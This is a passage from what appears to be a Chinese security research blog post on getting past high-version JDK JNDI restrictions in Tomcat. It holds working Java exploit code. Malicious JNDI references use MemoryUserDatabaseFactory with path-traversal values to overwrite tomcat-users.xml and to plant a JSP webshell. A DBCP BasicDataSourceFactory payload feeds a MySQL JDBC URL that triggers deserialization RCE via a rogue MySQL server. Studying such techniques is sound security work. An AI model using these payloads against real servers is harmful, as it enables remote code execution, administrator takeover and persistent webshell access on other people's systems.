    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    ResourceRef ref2 = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
    ref2.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../conf/tomcat-users.xml"));
    ref2.add(new StringRefAddr("readonly", "false"));
    InitialContext context = new InitialContext(env);
    context.bind("remoteImpl", ref2);
    //先运行setup1创建两个目录，然后运行该setup2，需要在本地开http且存在../../conf/tomcat-users.xml文件，写tomcat管理文件
}
```

由于是linux Tomcat+JDK11环境，不放测试了



### 写webapps/ROOT webshell

test.jsp

```xml
<role rolename="&#x3c;%Runtime.getRuntime().exec(&#x22;calc&#x22;); %&#x3e;"/>
```

同样的开http，再开一个JNDI Server创建`http://127.0.0.1:8888`目录，再让目标下载test.jsp到webapps/ROOT

```java
public static void main(String[] args) throws Exception {
    LocateRegistry.createRegistry(1099);
    Hashtable<String, String> env = new Hashtable<>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    ResourceRef ref2 = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
    ref2.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../webapps/ROOT/test.jsp"));
    ref2.add(new StringRefAddr("readonly", "false"));
    InitialContext context = new InitialContext(env);
    context.bind("remoteImpl", ref2);
    //先运行setup1创建两个目录，然后运行该setup2，需要在本地开http且存在../../conf/tomcat-users.xml文件，写tomcat管理文件
}
```



## JDBC Attack

除了beanFactory,MemoryUserDatabaseFactory外，还有JDBC factory可以利用

dbcp分为dbcp1和dbcp2，同时又分为 commons-dbcp 和 Tomcat 自带的 dbcp。这么一算的话有四个dhcp的类，不过其中代码都是大致相同的

比如tomcat的dhcp2，Tomcat8自带dhcp2，7自带dhcp

以Tomcat8的`org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory`为例

不忘初心，该factory继承了ObjectFactory

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214424473.png)

重写了getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214509825.png)

调用了createDataSource

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214524364.png)

createDataSource方法,InitialSize > 0时会调用getLogWriter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126211800091.png)

跟进到getLogWriter，这是个数据库的日志记录函数（为什么总感觉这么熟悉，还好blog有全局搜索，在分析C3P0的时候，ConnectionPoolDataSource也实现了getLogWriter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126213316784.png)

这里需要先去看下JDBC ATTACK

https://godownio.github.io/2024/12/01/jdbc-attack/

继续跟到BasicDataSource.createDatasource，createPollableConnectionFactory连接数据库工厂

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142500301.png)

createPoolableConnectionFactory构造函数调用到validateConnectionFactory，然后调用了makeObject

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142627267.png)

在makeObject调用createConnection

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142742993.png)

createConnection对我们传入的JDBC串进行connect，下面就是根据不同的JDBC串进行connect的流程了，比如这里用的Mysql，就会进到`com.mysql.cj.jdbc`connect的流程

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142846039.png)



payload的JDBC串需要根据目标机现有的数据库依赖进行选择，如果目标机有H2+JDK11就能打RUNSCRIPT之类的，这里假设目标用的MySQL

```java
private static String tomcat_dbcp2_RCE(){
    return "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory";
}
private static String tomcat_dbcp1_RCE(){
    return "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory";
}
private static String commons_dbcp2_RCE(){
    return "org.apache.commons.dbcp2.BasicDataSourceFactory";
}
private static String commons_dbcp1_RCE(){
    return "org.apache.commons.dbcp.BasicDataSourceFactory";
}
public static void main(String[] args) throws Exception {
    LocateRegistry.createRegistry(1099);
    Hashtable<String, String> env = new Hashtable<>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    String factory = tomcat_dbcp2_RCE();
    ResourceRef ref = new ResourceRef("javax.sql.DataSource", null, "", "", true, factory, null);
    String JDBC_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//根据数据库依赖修改JDBC串
    ref.add(new StringRefAddr("driverClassName","com.mysql.jdbc.Driver"));
    ref.add(new StringRefAddr("url",JDBC_URL));
    ref.add(new StringRefAddr("username","root"));
    ref.add(new StringRefAddr("password","password"));
    ref.add(new StringRefAddr("initialSize","1"));
    InitialContext context = new InitialContext(env);
    context.bind("remoteImpl", ref);//创建http:目录，然后创建127.0.0.1:8888目录
}
```

本地起恶意MySQL Server + JNDI Server

![高版本JNDI JDBC MySQL绕过](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E9%AB%98%E7%89%88%E6%9C%ACJNDI%20JDBC%20MySQL%E7%BB%95%E8%BF%87.gif)









当然有Tomcat环境都能实现以上攻击，不限Tomcat8/9，SpringBoot 1.2.x+

参考：

https://tttang.com/archive/1405/#toc_mvel
